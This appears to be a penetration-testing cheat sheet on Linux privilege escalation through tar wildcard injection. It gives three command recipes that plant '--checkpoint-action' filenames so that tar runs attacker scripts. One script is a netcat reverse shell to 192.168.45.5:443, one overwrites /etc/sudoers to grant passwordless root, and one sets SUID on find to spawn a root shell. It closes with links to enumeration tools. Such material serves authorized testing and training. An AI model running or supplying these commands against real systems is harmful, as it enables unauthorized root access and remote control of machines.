# Linux/Unix

## Tar Wildcard

### **Tar Wildcard Injection (1st method)**

```
echo "mkfifo /tmp/lhennp; nc 192.168.45.5 443 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar * 
```

### **Tar Wildcard Injection (2st method)**

```
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

sudo -l
sudo bash
whoami
```

### Tar Wildcard Injection (3rd method)

```
echo "chmod u+s /usr/bin/find" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami
```

#### Resources

{% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}

## Automated Resources

{% embed url="https://github.com/rebootuser/LinEnum.git" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

